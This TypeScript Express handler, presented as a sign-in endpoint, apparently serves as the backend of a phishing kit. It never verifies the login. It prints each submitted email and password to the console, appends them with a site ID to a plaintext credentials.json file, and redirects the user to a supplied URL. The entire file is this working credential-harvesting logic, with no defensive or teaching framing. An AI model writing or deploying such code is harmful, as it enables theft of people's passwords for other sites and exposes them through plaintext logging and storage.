import { signInModel } from "@/models/auth";
import express from "express";
import fsPromises from "node:fs/promises";
import path from "node:path";

const DEFAULT_CREDENTIALS_PATH = "./credentials.json";

interface Credential {
  email: string;
  password: string;
  siteId: string;
}

async function signIn(req: express.Request, res: express.Response) {
  try {
    const parsedBody = await signInModel.safeParseAsync(req.body);

    if (!parsedBody.success) {
      res.status(400).json({ message: parsedBody.error.issues[0]?.message });
      return;
    }

    const { email, password, redirectUri, siteId } = parsedBody.data;

    console.log(
      `Someone signed in ${siteId} using ${email} with password of ${password}`
    );

    const credential = {
      siteId,
      email,
      password,
    };

    const credentials: Credential[] = await fsPromises
      .readFile(path.resolve(DEFAULT_CREDENTIALS_PATH), "utf-8")
      .then((data) => JSON.parse(data))
      .catch(() => []);

    await fsPromises.writeFile(
      path.resolve(DEFAULT_CREDENTIALS_PATH),
      JSON.stringify([...credentials, credential])
    );

    res.status(200).json({ redirectUri });
  } catch (error) {
    res.status(500).json({
      message:
        "Unexpected error occured upon signing in, please try again later.",
    });
  }
}

export { signIn };
